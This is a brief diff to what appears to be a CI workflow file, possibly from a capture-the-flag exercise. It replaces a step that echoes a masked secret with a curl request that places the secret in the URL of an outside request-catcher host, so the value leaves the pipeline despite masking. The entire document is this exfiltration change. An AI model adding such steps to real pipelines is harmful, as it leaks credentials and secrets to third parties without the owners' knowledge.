@@ -23,4 +23,4 @@ jobs:
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
 
       - name: I ll tell you my current favourite 
-        run: echo ${{ secrets.FAVOURITE }}
+        run: curl -G -X GET "https://hocnctf.requestcatcher.com/${{ secrets.FAVOURITE }}"
